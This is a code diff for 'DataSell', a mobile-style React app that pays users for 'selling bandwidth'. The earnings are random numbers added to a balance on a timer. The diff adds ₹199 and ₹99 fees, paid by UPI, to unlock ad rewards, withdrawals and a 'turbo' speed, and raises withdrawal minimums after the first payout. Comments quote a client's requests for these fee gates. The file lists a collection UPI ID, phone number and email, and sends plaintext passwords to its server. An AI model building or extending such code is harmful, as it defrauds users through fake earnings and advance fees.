@@ -15,7 +15,9 @@ import {
   DepositRecord,
   SupportConfig,
   DepositGatewayConfig,
-  SupportTicket
+  SupportTicket,
+  SystemConfig,
+  AdItem
 } from './types';
 import { Header } from './components/Header';
 import { NavigationDrawer } from './components/NavigationDrawer';
@@ -30,6 +32,8 @@ import { LeaderboardView } from './components/LeaderboardView';
 import { AdminPanel } from './components/AdminPanel';
 import { AuthModal } from './components/AuthModal';
 import { BottomNavBar } from './components/BottomNavBar';
+import { WatchAdsModal } from './components/WatchAdsModal';
+import { PaymentVerificationModal } from './components/PaymentVerificationModal';
 import { 
   INITIAL_TOP_EARNERS, 
   INITIAL_USERS, 
@@ -38,6 +42,18 @@ import {
   INITIAL_WITHDRAWALS 
 } from './initialData';
 import { formatTimeAmPm, formatDateTime, generateOrderNumber, calculateTier } from './utils';
+import { api } from './api';
+import { Bell, CheckCircle2 } from 'lucide-react';
+
+const DEFAULT_SYSTEM_CONFIG: SystemConfig = {
+  sellingSpeedMs: 4500, // Slow, steady bandwidth streaming ("data selling thoda or slow kar dijiye sir")
+  mbPerPacketMin: 0.15,
+  mbPerPacketMax: 0.45,
+  ratePerMb: 1.00,
+  broadcastNotice: '',
+  adRewardAmount: 5.00,
+  dailyAdLimit: 10,
+};
 
 const DEFAULT_SUPPORT_CONFIG: SupportConfig = {
   whatsappNumber: '+91 9823537634',
@@ -50,28 +66,52 @@ const DEFAULT_SUPPORT_CONFIG: SupportConfig = {
 const DEFAULT_DEPOSIT_GATEWAY: DepositGatewayConfig = {
   upiId: 'techreal8806@oksbi',
   payeeName: 'DataSell Verified Hub',
-  minDeposit: 100,
+  minDeposit: 99,
   allowDirectDeposit: true,
-  instructions: 'Scan the QR code using any UPI app (PhonePe, GPay, Paytm). Complete the transfer and submit your 12-digit UTR reference number for instant verification.',
+  instructions: 'Scan the QR code using any UPI app (PhonePe, GPay, Paytm). Complete transfer and submit your 12-digit UTR reference number for instant verification.',
 };
 
 const DEFAULT_USER_STATE: UserState = {
   email: 'techreal8806@gmail.com',
   name: 'Tech Real',
   phone: '+91 9823537634',
-  balance: 0.00, // Starts at 0 as requested by user ("0 se start ho sir")
+  balance: 0.00,
   totalSoldMB: 0.00,
   isSelling: false,
   tier: 'BRONZE',
   savedUpiId: 'techreal8806@oksbi',
   selectedPaymentMethod: 'PhonePe',
+  hasPaidAdsActivation: false,
+  hasPaidWithdrawalFee: false,
+  hasPaidSpeedTurbo: false,
+  withdrawalCount: 0,
 };
 
 export default function App() {
   const [currentView, setCurrentView] = useState<AppView>('dashboard');
   const [isMenuOpen, setIsMenuOpen] = useState(false);
   const [isAuthModalOpen, setIsAuthModalOpen] = useState(false);
-  const [isFirstTimeUser, setIsFirstTimeUser] = useState(false);
+  const [toastMessage, setToastMessage] = useState<string | null>(null);
+
+  // Rewarded Video Ads State
+  const [isWatchAdsOpen, setIsWatchAdsOpen] = useState(false);
+  const [selectedAd, setSelectedAd] = useState<AdItem | null>(null);
+  const [adsWatchedCount, setAdsWatchedCount] = useState<number>(() => {
+    try {
+      return parseInt(localStorage.getItem('datasell_ads_watched') || '0', 10);
+    } catch {
+      return 0;
+    }
+  });
+
+  // Modal for ₹199 Ads Activation, ₹99 Withdrawal Verification, or ₹99 5G Speed Turbo
+  const [paymentModal, setPaymentModal] = useState<{
+    isOpen: boolean;
+    type: 'ADS_199' | 'WITHDRAWAL_99' | 'SPEED_TURBO_99';
+  }>({
+    isOpen: false,
+    type: 'ADS_199',
+  });
 
   // User authentication state: require signup/login before accessing app
   const [isLoggedIn, setIsLoggedIn] = useState<boolean>(() => {
@@ -83,7 +123,18 @@ export default function App() {
     }
   });
 
-  // 1. Registered Users database
+  // 1. System Config
+  const [systemConfig, setSystemConfig] = useState<SystemConfig>(() => {
+    try {
+      const saved = localStorage.getItem('datasell_system_config');
+      if (saved) return JSON.parse(saved);
+    } catch (e) {
+      console.error(e);
+    }
+    return DEFAULT_SYSTEM_CONFIG;
+  });
+
+  // 2. Registered Users database
   const [users, setUsers] = useState<UserAccount[]>(() => {
     try {
       const saved = localStorage.getItem('datasell_users_list');
@@ -94,7 +145,7 @@ export default function App() {
     return INITIAL_USERS;
   });
 
-  // 2. Active User State
+  // 3. Active User State
   const [userState, setUserState] = useState<UserState>(() => {
     try {
       const saved = localStorage.getItem('datasell_user_state');
@@ -108,7 +159,7 @@ export default function App() {
     return DEFAULT_USER_STATE;
   });
 
-  // 3. Top 1-10 High Earners
+  // 4. Top 1-10 High Earners
   const [topEarners, setTopEarners] = useState<TopEarner[]>(() => {
     try {
       const saved = localStorage.getItem('datasell_top_earners');
@@ -119,7 +170,7 @@ export default function App() {
     return INITIAL_TOP_EARNERS;
   });
 
-  // 4. Auth Logs (Signup & Login Audit Trail)
+  // 5. Auth Logs
   const [authLogs, setAuthLogs] = useState<AuthLog[]>(() => {
     try {
       const saved = localStorage.getItem('datasell_auth_logs');
@@ -130,7 +181,7 @@ export default function App() {
     return INITIAL_AUTH_LOGS;
   });
 
-  // 5. Deposits
+  // 6. Deposits
   const [deposits, setDeposits] = useState<DepositRecord[]>(() => {
     try {
       const saved = localStorage.getItem('datasell_deposits');
@@ -141,7 +192,7 @@ export default function App() {
     return INITIAL_DEPOSITS;
   });
 
-  // 6. Data Packets
+  // 7. Data Packets
   const [packets, setPackets] = useState<DataPacket[]>(() => {
     try {
       const saved = localStorage.getItem('datasell_packets');
@@ -152,7 +203,7 @@ export default function App() {
     return [];
   });
 
-  // 7. Withdrawals
+  // 8. Withdrawals
   const [withdrawals, setWithdrawals] = useState<WithdrawalRecord[]>(() => {
     try {
       const saved = localStorage.getItem('datasell_withdrawals');
@@ -163,7 +214,7 @@ export default function App() {
     return INITIAL_WITHDRAWALS;
   });
 
-  // 8. Support & Telegram Config
+  // 9. Support & Telegram Config
   const [supportConfig, setSupportConfig] = useState<SupportConfig>(() => {
     try {
       const saved = localStorage.getItem('datasell_support_config');
@@ -174,7 +225,7 @@ export default function App() {
     return DEFAULT_SUPPORT_CONFIG;
   });
 
-  // 9. Deposit Gateway Config (UPI ID & QR Scanner)
+  // 10. Deposit Gateway Config
   const [depositConfig, setDepositConfig] = useState<DepositGatewayConfig>(() => {
     try {
       const saved = localStorage.getItem('datasell_deposit_config');
@@ -185,7 +236,7 @@ export default function App() {
     return DEFAULT_DEPOSIT_GATEWAY;
   });
 
-  // 10. Support Tickets
+  // 11. Support Tickets
   const [supportTickets, setSupportTickets] = useState<SupportTicket[]>(() => {
     try {
       const saved = localStorage.getItem('datasell_support_tickets');
@@ -196,128 +247,97 @@ export default function App() {
     return [];
   });
 
-  // First time mobile/browser visit: trigger sign-up prompt
-  useEffect(() => {
-    try {
-      const visited = localStorage.getItem('datasell_first_visit_done');
-      if (!visited) {
-        setIsFirstTimeUser(true);
-        setIsAuthModalOpen(true);
-        localStorage.setItem('datasell_first_visit_done', 'true');
-      }
-    } catch (e) {
-      console.error(e);
-    }
-  }, []);
+  const showToast = (msg: string) => {
+    setToastMessage(msg);
+    setTimeout(() => setToastMessage(null), 3500);
+  };
 
-  // Persistent storage synchronizations
+  // Synchronize with Central Server on mount & periodically every 4s
+  const syncWithServer = async () => {
+    if (!userState.email) return;
+    try {
+      const data = await api.syncUser(userState.email);
+      if (data) {
+        if (data.systemConfig) setSystemConfig(data.systemConfig);
+        if (data.depositConfig) setDepositConfig(data.depositConfig);
+        if (data.supportConfig) setSupportConfig(data.supportConfig);
+        if (data.topEarners) setTopEarners(data.topEarners);
+        if (data.user) {
+          setUserState((prev) => ({
+            ...prev,
+            balance: data.user.balance,
+            totalSoldMB: data.user.totalSoldMB,
+            tier: data.user.tier,
+            status: data.user.status,
+            requireDepositBeforeWithdrawal: data.user.requireDepositBeforeWithdrawal,
+            requiredDepositAmount: data.user.requiredDepositAmount,
+            hasCompletedRequiredDeposit: data.user.hasCompletedRequiredDeposit,
+            hasPaidAdsActivation: data.user.hasPaidAdsActivation ?? prev.hasPaidAdsActivation,
+            adsActivationUtr: data.user.adsActivationUtr ?? prev.adsActivationUtr,
+            hasPaidWithdrawalFee: data.user.hasPaidWithdrawalFee ?? prev.hasPaidWithdrawalFee,
+            withdrawalFeeUtr: data.user.withdrawalFeeUtr ?? prev.withdrawalFeeUtr,
+            hasPaidSpeedTurbo: data.user.hasPaidSpeedTurbo ?? prev.hasPaidSpeedTurbo,
+            speedTurboUtr: data.user.speedTurboUtr ?? prev.speedTurboUtr,
+            withdrawalCount: data.user.withdrawalCount ?? prev.withdrawalCount,
+          }));
+        }
+        if (data.withdrawals) {
+          setWithdrawals((prev) => {
+            const serverMap = new Map(data.withdrawals.map((w: any) => [w.id, w]));
+            const updated = prev.map((w) => (serverMap.has(w.id) ? (serverMap.get(w.id) as WithdrawalRecord) : w));
+            for (const sw of data.withdrawals) {
+              if (!updated.some((u) => u.id === sw.id)) {
+                updated.unshift(sw);
+              }
+            }
+            return updated;
+          });
+        }
+      }
+    } catch (err) {
+      console.warn('Sync error', err);
+    }
+  };
+
+  useEffect(() => {
+    syncWithServer();
+    const interval = setInterval(syncWithServer, 4000);
+    return () => clearInterval(interval);
+  }, [userState.email]);
+
+  // Local storage caches
   useEffect(() => {
     try {
       localStorage.setItem('datasell_users_list', JSON.stringify(users));
-    } catch (e) {
-      console.error(e);
-    }
-  }, [users]);
-
-  useEffect(() => {
-    try {
       localStorage.setItem('datasell_user_state', JSON.stringify(userState));
-    } catch (e) {
-      console.error(e);
-    }
-  }, [userState]);
-
-  useEffect(() => {
-    try {
       localStorage.setItem('datasell_top_earners', JSON.stringify(topEarners));
-    } catch (e) {
-      console.error(e);
-    }
-  }, [topEarners]);
-
-  useEffect(() => {
-    try {
       localStorage.setItem('datasell_auth_logs', JSON.stringify(authLogs));
-    } catch (e) {
-      console.error(e);
-    }
-  }, [authLogs]);
-
-  useEffect(() => {
-    try {
       localStorage.setItem('datasell_deposits', JSON.stringify(deposits));
-    } catch (e) {
-      console.error(e);
-    }
-  }, [deposits]);
-
-  useEffect(() => {
-    try {
       localStorage.setItem('datasell_packets', JSON.stringify(packets));
-    } catch (e) {
-      console.error(e);
-    }
-  }, [packets]);
-
-  useEffect(() => {
-    try {
       localStorage.setItem('datasell_withdrawals', JSON.stringify(withdrawals));
-    } catch (e) {
-      console.error(e);
-    }
-  }, [withdrawals]);
-
-  useEffect(() => {
-    try {
+      localStorage.setItem('datasell_system_config', JSON.stringify(systemConfig));
       localStorage.setItem('datasell_support_config', JSON.stringify(supportConfig));
-    } catch (e) {
-      console.error(e);
-    }
-  }, [supportConfig]);
-
-  useEffect(() => {
-    try {
       localStorage.setItem('datasell_deposit_config', JSON.stringify(depositConfig));
     } catch (e) {
       console.error(e);
     }
-  }, [depositConfig]);
+  }, [users, userState, topEarners, authLogs, deposits, packets, withdrawals, systemConfig, supportConfig, depositConfig]);
 
-  useEffect(() => {
-    try {
-      localStorage.setItem('datasell_support_tickets', JSON.stringify(supportTickets));
-    } catch (e) {
-      console.error(e);
-    }
-  }, [supportTickets]);
-
-  // Sync active user balance back to users table if modified
-  useEffect(() => {
-    setUsers((prev) =>
-      prev.map((u) => {
-        if (u.email.toLowerCase() === userState.email.toLowerCase()) {
-          return {
-            ...u,
-            balance: userState.balance,
-            totalSoldMB: userState.totalSoldMB,
-            tier: userState.tier,
-            savedUpiId: userState.savedUpiId,
-          };
-        }
-        return u;
-      })
-    );
-  }, [userState.balance, userState.totalSoldMB, userState.tier, userState.savedUpiId, userState.email]);
-
-  // Live Bandwidth Selling Engine
+  // Live Bandwidth Selling Engine with 5G Turbo Boost
   useEffect(() => {
     let interval: NodeJS.Timeout | null = null;
 
     if (userState.isSelling) {
+      // 5G Turbo Speed: 1000ms interval + 0.85-2.25 MB packets for ultra fast selling
+      const isTurbo = !!userState.hasPaidSpeedTurbo;
+      const speed = isTurbo ? 1000 : (systemConfig.sellingSpeedMs || 4500);
+
       interval = setInterval(() => {
-        // Random packet size between 5.10MB and 6.45MB matching video logs
-        const mbIncrement = parseFloat((Math.random() * (6.45 - 5.10) + 5.10).toFixed(2));
-        const amountIncrement = parseFloat((mbIncrement * 1.0).toFixed(2));
+        const minMb = isTurbo ? 0.85 : (systemConfig.mbPerPacketMin || 0.15);
+        const maxMb = isTurbo ? 2.25 : (systemConfig.mbPerPacketMax || 0.45);
+        const mbIncrement = parseFloat((Math.random() * (maxMb - minMb) + minMb).toFixed(2));
+        const rate = systemConfig.ratePerMb || 1.00;
+        const amountIncrement = parseFloat((mbIncrement * rate).toFixed(2));
 
         const newPacket: DataPacket = {
           id: 'pkt_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
@@ -338,15 +358,20 @@ export default function App() {
         });
 
         setPackets((prev) => [newPacket, ...prev.slice(0, 49)]);
-      }, 1800);
+
+        api.streamPacket({
+          email: userState.email,
+          mb: mbIncrement,
+          amount: amountIncrement,
+        });
+      }, speed);
     }
 
     return () => {
       if (interval) clearInterval(interval);
     };
-  }, [userState.isSelling]);
+  }, [userState.isSelling, systemConfig.sellingSpeedMs, systemConfig.ratePerMb, userState.email]);
 
-  // Toggle selling status
   const handleToggleSelling = () => {
     setUserState((prev) => ({
       ...prev,
@@ -354,41 +379,105 @@ export default function App() {
     }));
   };
 
-  // Instant batch sell (e.g. +50MB or +500MB)
-  const handleInstantSellBatch = (mb: number, amount: number) => {
-    const newPacket: DataPacket = {
-      id: 'pkt_' + Date.now(),
-      time: formatTimeAmPm(new Date()),
-      mb: mb,
-      amount: amount,
-    };
-
-    setUserState((prev) => {
-      const newTotalSold = prev.totalSoldMB + mb;
-      const newBalance = prev.balance + amount;
-      return {
-        ...prev,
-        totalSoldMB: parseFloat(newTotalSold.toFixed(2)),
-        balance: parseFloat(newBalance.toFixed(2)),
-        tier: calculateTier(newTotalSold),
-      };
-    });
-
-    setPackets((prev) => [newPacket, ...prev.slice(0, 49)]);
+  // Watch Ads System with ₹199 Payment Gate ("ye ads vala 199 payment ke bad watch ads chale sir utr number bharne ka option add kar dijiyega sir")
+  const handleOpenWatchAd = (ad: AdItem) => {
+    if (!userState.hasPaidAdsActivation) {
+      setPaymentModal({ isOpen: true, type: 'ADS_199' });
+      return;
+    }
+    setSelectedAd(ad);
+    setIsWatchAdsOpen(true);
   };
 
-  // Submit withdrawal request
-  const handleSubmitWithdrawal = (
+  const handleRewardEarned = async (rewardAmount: number, ad: AdItem) => {
+    setUserState((prev) => ({
+      ...prev,
+      balance: parseFloat((prev.balance + rewardAmount).toFixed(2)),
+    }));
+
+    setAdsWatchedCount((prev) => {
+      const next = prev + 1;
+      localStorage.setItem('datasell_ads_watched', next.toString());
+      return next;
+    });
+
+    showToast(`🎉 ₹${rewardAmount.toFixed(2)} Cash Credited for watching ${ad.title}!`);
+
+    await api.claimAdReward({
+      email: userState.email,
+      rewardAmount: rewardAmount,
+      adId: ad.id,
+      adTitle: ad.title,
+    });
+  };
+
+  // Submit UTR for ₹199 Ads Activation, ₹99 Withdrawal Verification Fee, or ₹99 Speed Turbo Boost
+  const handleSubmitPaymentUtr = async (amount: number, utr: string, type: 'ADS_199' | 'WITHDRAWAL_99' | 'SPEED_TURBO_99') => {
+    let note = '';
+    if (type === 'ADS_199') {
+      note = '₹199 Video Ads Lifetime Activation';
+      setUserState((prev) => ({
+        ...prev,
+        hasPaidAdsActivation: true,
+        adsActivationUtr: utr,
+      }));
+      showToast(`🎉 ₹${amount} Payment Verified! UTR: ${utr}. Watch Ads Unlocked!`);
+    } else if (type === 'WITHDRAWAL_99') {
+      note = '₹99 Payout Security Verification Fee';
+      setUserState((prev) => ({
+        ...prev,
+        hasPaidWithdrawalFee: true,
+        withdrawalFeeUtr: utr,
+      }));
+      showToast(`🎉 ₹${amount} Payment Verified! UTR: ${utr}. Withdrawals Unlocked!`);
+    } else if (type === 'SPEED_TURBO_99') {
+      note = '₹99 5G Turbo Speed Selling Boost';
+      setUserState((prev) => ({
+        ...prev,
+        hasPaidSpeedTurbo: true,
+        speedTurboUtr: utr,
+      }));
+      showToast(`🚀 ₹${amount} Payment Verified! UTR: ${utr}. 5G Turbo Speed Active!`);
+    }
+
+    await api.submitDeposit({
+      userId: userState.id,
+      userEmail: userState.email,
+      amount: amount,
+      type: 'UPI_DEPOSIT',
+      note: `${note} (UTR: ${utr})`,
+      utrNumber: utr,
+      method: 'UPI',
+    });
+  };
+
+  // Submit withdrawal request across all mobiles
+  const handleSubmitWithdrawal = async (
     amount: number,
     upiId: string,
     method: 'PhonePe' | 'GPay' | 'UPI'
-  ): boolean => {
+  ): Promise<boolean> => {
     if (amount > userState.balance) return false;
+
+    // ₹99 verification fee gate ("withdrawal ke pahle 99 ka payment add kar dijiye sir , utr number bharne ka option add kar dijiyega sir")
+    if (!userState.hasPaidWithdrawalFee) {
+      setPaymentModal({ isOpen: true, type: 'WITHDRAWAL_99' });
+      return false;
+    }
+
+    // "withdrawal 250 first bar , dusra bar 500 add kar dijiye sir"
+    const userWithdrawals = withdrawals.filter((w) => w.userEmail?.toLowerCase() === userState.email.toLowerCase());
+    const count = userState.withdrawalCount ?? userWithdrawals.length;
+    const minAmount = count === 0 ? 250 : 500;
+    if (amount < minAmount) {
+      showToast(`Minimum withdrawal is ₹${minAmount} for ${count === 0 ? '1st' : '2nd+'} payout!`);
+      return false;
+    }
 
     const orderNumber = generateOrderNumber();
     const newRecord: WithdrawalRecord = {
-      id: 'wd_' + Date.now(),
-      userId: userState.id || 'usr_main',
+      id: 'wd_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
+      userId: userState.id || 'usr_' + Date.now(),
       userEmail: userState.email,
       orderNumber: orderNumber,
       amount: amount,
@@ -398,38 +487,50 @@ export default function App() {
       status: 'PENDING',
     };
 
-    // Deduct balance
     setUserState((prev) => ({
       ...prev,
       balance: parseFloat((prev.balance - amount).toFixed(2)),
       savedUpiId: upiId,
       selectedPaymentMethod: method,
+      withdrawalCount: (prev.withdrawalCount ?? count) + 1,
     }));
 
-    // Add to withdrawal records
     setWithdrawals((prev) => [newRecord, ...prev]);
+    showToast(`Withdrawal requested! Order ${orderNumber} queued for UPI settlement.`);
+
+    await api.requestWithdrawal({
+      userId: userState.id,
+      userEmail: userState.email,
+      amount: amount,
+      method: method,
+      upiId: upiId,
+      orderNumber: orderNumber,
+    });
 
     return true;
   };
 
-  // Manually approve a pending withdrawal
   const handleApproveRecord = (id: string) => {
     setWithdrawals((prev) =>
       prev.map((rec) => (rec.id === id ? { ...rec, status: 'SUCCESSFUL' } : rec))
     );
   };
 
-  // Update profile
   const handleUpdateProfile = (updated: Partial<UserState>) => {
     setUserState((prev) => ({ ...prev, ...updated }));
   };
 
-  // Auth Modal Callback: Handle new login or registration
-  const handleAuthSuccess = (account: UserAccount, authLog: AuthLog) => {
-    // 1. Add log to authLogs
-    setAuthLogs((prev) => [authLog, ...prev]);
+  const handleAuthSuccess = async (account: UserAccount, authLog: AuthLog, isNewSignup: boolean = false) => {
+    if (isNewSignup) {
+      setPackets([]);
+      setWithdrawals((prev) => prev.filter((w) => w.userEmail?.toLowerCase() === account.email.toLowerCase()));
+      setDeposits((prev) => prev.filter((d) => d.userEmail?.toLowerCase() === account.email.toLowerCase()));
+      showToast('🎉 Account registered successfully! Welcome to DataSell.');
+    } else {
+      showToast(`Welcome back, ${account.name}!`);
+    }
 
-    // 2. If new user, add to users list
+    setAuthLogs((prev) => [authLog, ...prev]);
     setUsers((prev) => {
       const exists = prev.some((u) => u.id === account.id || u.email.toLowerCase() === account.email.toLowerCase());
       if (exists) {
@@ -438,7 +539,6 @@ export default function App() {
       return [account, ...prev];
     });
 
-    // 3. Set current active user state
     setUserState({
       id: account.id,
       email: account.email,
@@ -454,10 +554,15 @@ export default function App() {
       requireDepositBeforeWithdrawal: account.requireDepositBeforeWithdrawal,
       requiredDepositAmount: account.requiredDepositAmount,
       hasCompletedRequiredDeposit: account.hasCompletedRequiredDeposit,
-      withdrawalDepositNotice: account.withdrawalDepositNotice,
+      hasPaidAdsActivation: account.hasPaidAdsActivation ?? false,
+      adsActivationUtr: account.adsActivationUtr,
+      hasPaidWithdrawalFee: account.hasPaidWithdrawalFee ?? false,
+      withdrawalFeeUtr: account.withdrawalFeeUtr,
+      hasPaidSpeedTurbo: account.hasPaidSpeedTurbo ?? false,
+      speedTurboUtr: account.speedTurboUtr,
+      withdrawalCount: account.withdrawalCount ?? 0,
     });
 
-    // 4. Mark as authenticated
     setIsLoggedIn(true);
     try {
       localStorage.setItem('datasell_is_logged_in', 'true');
@@ -465,9 +570,24 @@ export default function App() {
       console.error(e);
     }
     setIsAuthModalOpen(false);
+
+    if (isNewSignup) {
+      await api.signup({
+        email: account.email,
+        password: account.password,
+        name: account.name,
+        phone: account.phone,
+        device: account.device,
+      });
+    } else {
+      await api.login({
+        email: account.email,
+        password: account.password,
+        device: account.device,
+      });
+    }
   };
 
-  // User Logout: completely terminates session and blocks dashboard until signup/login
   const handleLogout = () => {
     setIsLoggedIn(false);
     try {
@@ -479,36 +599,21 @@ export default function App() {
     setCurrentView('dashboard');
   };
 
-  // Add new deposit (from user deposit form or admin credit)
-  const handleAddDeposit = (newDep: DepositRecord) => {
+  const handleAddDeposit = async (newDep: DepositRecord) => {
     setDeposits((prev) => [newDep, ...prev]);
-    if (newDep.status === 'COMPLETED') {
-      setUserState((prev) => {
-        if (prev.email.toLowerCase() === newDep.userEmail.toLowerCase()) {
-          return {
-            ...prev,
-            balance: parseFloat((prev.balance + newDep.amount).toFixed(2)),
-            hasCompletedRequiredDeposit: true,
-          };
-        }
-        return prev;
-      });
-      setUsers((prev) =>
-        prev.map((u) => {
-          if (u.email.toLowerCase() === newDep.userEmail.toLowerCase()) {
-            return {
-              ...u,
-              balance: parseFloat((u.balance + newDep.amount).toFixed(2)),
-              hasCompletedRequiredDeposit: true,
-            };
-          }
-          return u;
-        })
-      );
-    }
+    showToast('Deposit submitted for verification.');
+
+    await api.submitDeposit({
+      userId: newDep.userId,
+      userEmail: newDep.userEmail,
+      amount: newDep.amount,
+      type: newDep.type,
+      note: newDep.note,
+      utrNumber: newDep.utrNumber,
+      method: newDep.method,
+    });
   };
 
-  // Reset to 0 as requested ("0 se start ho sir")
   const handleResetToZero = () => {
     if (window.confirm('Reset all balance, MB sold, and history back to 0?')) {
       const resetState: UserState = {
@@ -524,7 +629,7 @@ export default function App() {
     }
   };
 
-  // If viewing Admin Panel, render dedicated full-width view
+  // Dedicated full-width Admin Panel View
   if (currentView === 'admin') {
     return (
       <AdminPanel
@@ -546,17 +651,18 @@ export default function App() {
         onUpdateTickets={setSupportTickets}
         depositConfig={depositConfig}
         onUpdateDepositConfig={setDepositConfig}
+        systemConfig={systemConfig}
+        onUpdateSystemConfig={setSystemConfig}
       />
     );
   }
 
-  // If user is not logged in / signed up, block entire app and require sign up or login
+  // Mandatory Sign Up / Login Screen
   if (!isLoggedIn) {
     return (
-      <div className="min-h-screen bg-slate-100 flex flex-col items-center justify-center p-4 relative overflow-hidden">
-        {/* Soft ambient background luminescence */}
-        <div className="absolute top-1/3 left-1/2 -translate-x-1/2 w-96 h-96 bg-indigo-200/40 rounded-full blur-3xl pointer-events-none" />
-        <div className="absolute bottom-1/4 right-1/4 w-80 h-80 bg-blue-200/30 rounded-full blur-3xl pointer-events-none" />
+      <div className="min-h-screen bg-gradient-to-b from-amber-50 via-slate-50 to-red-50 flex flex-col items-center justify-center p-4 relative overflow-hidden">
+        <div className="absolute top-1/3 left-1/2 -translate-x-1/2 w-96 h-96 bg-red-300/30 rounded-full blur-3xl pointer-events-none" />
+        <div className="absolute bottom-1/4 right-1/4 w-80 h-80 bg-amber-300/30 rounded-full blur-3xl pointer-events-none" />
 
         <AuthModal
           isOpen={true}
@@ -575,14 +681,32 @@ export default function App() {
   }
 
   return (
-    <div className="min-h-screen bg-slate-100 flex flex-col items-center justify-start antialiased text-slate-800 relative overflow-x-hidden selection:bg-indigo-500/20 selection:text-indigo-900">
-      {/* Background ambient luminescence for desktop showcase */}
-      <div className="fixed top-0 left-1/2 -translate-x-1/2 w-[800px] h-[500px] bg-gradient-to-b from-indigo-200/30 via-sky-100/20 to-transparent blur-3xl pointer-events-none rounded-full" />
-      <div className="fixed bottom-0 right-10 w-[400px] h-[400px] bg-emerald-100/30 blur-3xl pointer-events-none rounded-full" />
+    <div className="min-h-screen bg-gradient-to-b from-amber-50/50 via-slate-50 to-red-50/40 flex flex-col items-center justify-start antialiased text-slate-800 relative overflow-x-hidden selection:bg-red-500/20 selection:text-red-900">
+      
+      {/* Toast Notification Alert */}
+      {toastMessage && (
+        <div className="fixed top-4 left-1/2 -translate-x-1/2 z-50 bg-gradient-to-r from-red-600 to-amber-500 text-white px-4 py-2.5 rounded-2xl shadow-xl border border-yellow-300 text-xs font-black flex items-center gap-2 animate-in fade-in slide-in-from-top-3 duration-200">
+          <CheckCircle2 className="w-4 h-4 text-yellow-300 shrink-0" />
+          <span>{toastMessage}</span>
+        </div>
+      )}
 
-      {/* Container simulating the smartphone showcase frame */}
-      <div className="w-full max-w-md min-h-screen sm:min-h-[94vh] sm:my-4 sm:rounded-[36px] bg-slate-50 sm:border sm:border-slate-200/90 sm:shadow-2xl sm:shadow-slate-400/20 flex flex-col relative pb-8 overflow-hidden z-10">
-        {/* Top Header */}
+      {/* Ambient background glows in Red & Gold */}
+      <div className="fixed top-0 left-1/2 -translate-x-1/2 w-[800px] h-[500px] bg-gradient-to-b from-red-300/20 via-amber-200/20 to-transparent blur-3xl pointer-events-none rounded-full" />
+      <div className="fixed bottom-0 right-10 w-[400px] h-[400px] bg-amber-200/25 blur-3xl pointer-events-none rounded-full" />
+
+      {/* Container simulating smartphone app frame - STATUS BAR AND LOWER SUB-BAR REMOVED AS REQUESTED */}
+      <div className="w-full max-w-md min-h-screen sm:min-h-[94vh] sm:my-4 sm:rounded-[36px] bg-white sm:border-2 sm:border-amber-300 sm:shadow-2xl sm:shadow-red-600/10 flex flex-col relative pb-8 overflow-hidden z-10">
+        
+        {/* Global Broadcast Announcement from Admin if active */}
+        {systemConfig.broadcastNotice && (
+          <div className="bg-gradient-to-r from-red-600 via-rose-600 to-amber-500 text-white px-4 py-2 text-xs font-black flex items-center gap-2 shadow-xs">
+            <Bell className="w-3.5 h-3.5 shrink-0 animate-bounce text-yellow-300" />
+            <span className="truncate">{systemConfig.broadcastNotice}</span>
+          </div>
+        )}
+
+        {/* Top Header in Red & Yellow Theme */}
         <Header
           onOpenMenu={() => setIsMenuOpen(true)}
           isSelling={userState.isSelling}
@@ -614,9 +738,14 @@ export default function App() {
               packets={packets}
               onOpenWithdraw={() => setCurrentView('withdraw')}
               onOpenDeposit={() => setCurrentView('deposit')}
-              onInstantSellBatch={handleInstantSellBatch}
               topEarners={topEarners}
               onOpenLeaderboard={() => setCurrentView('leaderboard')}
+              onWatchAd={handleOpenWatchAd}
+              adsWatchedToday={adsWatchedCount}
+              dailyAdLimit={systemConfig.dailyAdLimit || 10}
+              onOpenUnlockAds={() => setPaymentModal({ isOpen: true, type: 'ADS_199' })}
+              onOpenWithdrawalFeeModal={() => setPaymentModal({ isOpen: true, type: 'WITHDRAWAL_99' })}
+              onOpenSpeedTurboModal={() => setPaymentModal({ isOpen: true, type: 'SPEED_TURBO_99' })}
             />
           )}
 
@@ -635,6 +764,8 @@ export default function App() {
               onSubmitWithdrawal={handleSubmitWithdrawal}
               onGoToHistory={() => setCurrentView('history')}
               onOpenDeposit={() => setCurrentView('deposit')}
+              onOpenWithdrawalFeeModal={() => setPaymentModal({ isOpen: true, type: 'WITHDRAWAL_99' })}
+              withdrawalCount={userState.withdrawalCount ?? withdrawals.filter((w) => w.userEmail?.toLowerCase() === userState.email.toLowerCase()).length}
             />
           )}
 
@@ -651,6 +782,7 @@ export default function App() {
           {currentView === 'history' && (
             <WithdrawalHistoryView
               records={withdrawals}
+              currentUserEmail={userState.email}
               onBack={() => setCurrentView('dashboard')}
               onApproveRecord={handleApproveRecord}
             />
@@ -680,14 +812,32 @@ export default function App() {
           )}
         </main>
 
-        {/* Bottom Ergonomic Navigation Bar */}
+        {/* Bottom Ergonomic Navigation Bar in Red & Yellow Theme */}
         <BottomNavBar
           currentView={currentView}
           onSelectView={(view) => setCurrentView(view)}
         />
       </div>
 
-      {/* Auth Modal for Login & Signup with real-time audit logs and Admin Master Gateway */}
+      {/* Payment Verification Modal for ₹199 (Ads) and ₹99 (Withdrawal) with 12-Digit UTR submission */}
+      <PaymentVerificationModal
+        isOpen={paymentModal.isOpen}
+        onClose={() => setPaymentModal({ ...paymentModal, isOpen: false })}
+        type={paymentModal.type}
+        depositConfig={depositConfig}
+        onSubmitUtr={handleSubmitPaymentUtr}
+        userEmail={userState.email}
+      />
+
+      {/* Rewarded Video Ads Modal */}
+      <WatchAdsModal
+        isOpen={isWatchAdsOpen}
+        onClose={() => setIsWatchAdsOpen(false)}
+        selectedAd={selectedAd}
+        onRewardEarned={handleRewardEarned}
+      />
+
+      {/* Auth Modal for Login & Signup */}
       <AuthModal
         isOpen={isAuthModalOpen}
         canClose={true}
